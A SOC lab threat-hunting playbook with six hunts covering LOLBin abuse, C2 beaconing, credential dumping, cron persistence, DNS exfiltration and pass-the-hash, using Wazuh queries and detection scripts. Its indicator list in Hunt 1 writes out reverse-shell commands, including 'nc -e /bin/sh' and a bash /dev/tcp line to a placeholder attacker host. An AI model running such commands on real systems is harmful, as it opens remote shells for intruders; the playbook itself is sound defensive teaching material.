# Threat Hunting Playbooks — SOC Lab

Threat hunting is proactive — you're looking for threats that haven't triggered alerts yet.

---

## Hunt 1 — Detect Living-Off-the-Land (LOLBin) Abuse

**Hypothesis:** Attacker is using legitimate tools (bash, python, curl, nc) for malicious purposes.

**Data Source:** Wazuh command auditing / auditd logs

### Query in Wazuh Dashboard

Go to **Discover** → OpenSearch → query:

```
rule.groups:auditd AND data.audit.command:(curl OR wget OR nc OR python OR python3 OR perl OR ruby OR bash)
```

### Manual Hunt via API

```bash
# Query Wazuh for suspicious command executions
TOKEN=$(curl -su admin:PASS https://192.168.10.10:55000/security/user/authenticate \
    -k | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")

curl -sk -H "Authorization: Bearer $TOKEN" \
    "https://192.168.10.10:55000/security/events?q=data.audit.command=nc" \
    | python3 -m json.tool | grep -E "command|user|timestamp|srcip"
```

### Indicators of LOLBin abuse:
- `curl` or `wget` with `-o` writing to `/tmp`, `/dev/shm`, `/var/tmp`
- `python3 -c` or `perl -e` with base64 encoded payload
- `nc -e /bin/sh` (reverse shell)
- `bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`

---

## Hunt 2 — Detect Beaconing / C2 Communication

**Hypothesis:** A compromised host is periodically calling back to a C2 server.

**Data Source:** Squid proxy access logs (via pfSense → Wazuh)

### Pattern: Regular intervals to same external IP

```bash
# On Wazuh server — analyze proxy logs for beaconing pattern
grep -v "192.168" /var/log/squid/access.log | \
    awk '{print $3, $7}' | \
    sort | uniq -c | sort -rn | head -20

# Beaconing: same URL, regular intervals (every 60s, 300s, etc.)
# Look for: low-entropy domain, many identical GETs, regular timing
```

### Timing analysis:
```python
#!/usr/bin/env python3
# beacon-detector.py — find regular-interval connections
from collections import defaultdict
import re

log_file = "/var/log/squid/access.log"
ip_times = defaultdict(list)

with open(log_file) as f:
    for line in f:
        parts = line.split()
        if len(parts) >= 7:
            timestamp = float(parts[0])
            src_ip = parts[2].split(':')[0]
            dest = parts[6]
            ip_times[(src_ip, dest)].append(timestamp)

for (src, dst), times in ip_times.items():
    if len(times) < 5:
        continue
    times.sort()
    intervals = [times[i+1] - times[i] for i in range(len(times)-1)]
    avg = sum(intervals) / len(intervals)
    variance = sum((x-avg)**2 for x in intervals) / len(intervals)

    # Low variance = regular beaconing
    if variance < 100 and avg < 600:
        print(f"BEACON SUSPECT: {src} → {dst}")
        print(f"  Connections: {len(times)}, Avg interval: {avg:.0f}s, Variance: {variance:.1f}")
```

---

## Hunt 3 — Detect Credential Dumping

**Hypothesis:** Attacker tried to dump credentials (shadow, SAM, etc.)

**Data Source:** Wazuh FIM alerts + auditd

### Linux credential access:
```bash
# Look for access to /etc/shadow
ausearch -f /etc/shadow -i | grep -E "type=SYSCALL|success|comm"

# Look for passwd command misuse
ausearch -c passwd -i | head -30

# Look for mimikatz-like Python tools
grep -r "import crypt" /tmp/ /dev/shm/ /var/tmp/ 2>/dev/null
```

### Windows credential access (via Wazuh + Windows agent):
```
# In Wazuh Dashboard — filter for Windows Security Event ID 4624 (logon)
# Cross-reference with: 4634 (logoff), 4648 (explicit credential use)
# Look for: Type 9 logons (RunAs with different creds)
rule.groups:windows AND data.win.system.eventID:(4648 OR 4768 OR 4769)
```

---

## Hunt 4 — Detect Unauthorized Scheduled Tasks

**Hypothesis:** Attacker established persistence via cron/scheduled task.

```bash
# Hunt for suspicious cron entries across all agents
# Via Wazuh — check FIM alerts on cron directories

# Manual hunt on each host:
for host in 192.168.30.10 192.168.30.20; do
    echo "=== $host ==="
    ssh -o StrictHostKeyChecking=no user@$host \
        "crontab -l 2>/dev/null; ls -la /etc/cron.*/ /var/spool/cron/"
done

# Look for:
# - Crons running from /tmp, /dev/shm, /var/tmp
# - Crons with base64 encoded commands
# - Crons running as root that weren't there before
```

---

## Hunt 5 — Data Exfiltration via DNS

**Hypothesis:** Attacker is exfiltrating data via DNS queries (DNS tunneling).

**Data Source:** pfSense DNS logs / Wazuh

```bash
# High DNS query volume from a single host
grep "query" /var/log/dns.log | \
    awk '{print $5}' | \
    sort | uniq -c | sort -rn | head -20

# Long DNS subdomain names (data encoding)
grep "query" /var/log/dns.log | \
    awk '{print $6}' | \
    awk -F'.' '{if (length($1) > 30) print}' | head -20

# DNS queries to rare TLDs
grep "query" /var/log/dns.log | grep -E "\.(xyz|tk|ml|ga|cf)\." | head -20
```

---

## Hunt 6 — Detect Lateral Movement via Pass-the-Hash

**Hypothesis:** Attacker captured NTLM hash and is reusing it.

**Data Source:** Windows Event Log (via Wazuh Windows agent)

```
# In Wazuh Dashboard:
# Look for Event ID 4624 with LogonType=3 (Network) AND AuthPackage=NTLM
# From a workstation IP (not a DC)

rule.groups:windows AND data.win.system.eventID:4624
AND data.win.eventdata.logonType:3
AND data.win.eventdata.authenticationPackageName:NTLM
```

### Red flag pattern:
- Same username, NTLM auth from multiple source IPs in short time
- NTLM auth to admin shares (C$, ADMIN$)
- LogonType 3 from a host that isn't a file server

---

## Hunt Tracking Sheet

| Hunt # | Hypothesis | Data Sources | Status | Findings |
|---|---|---|---|---|
| 1 | LOLBin abuse | Auditd, Wazuh | Completed | 2 curl-to-/tmp events |
| 2 | C2 Beaconing | Squid proxy logs | In Progress | — |
| 3 | Credential dump | FIM, auditd | Not started | — |
| 4 | Persistence (cron) | FIM, cron dirs | Not started | — |
| 5 | DNS exfiltration | pfSense DNS | Not started | — |
| 6 | Pass-the-Hash | Win Event Log | Not started | — |

**Document each hunt:** Hypothesis → Data sources → Query → Findings → Actions
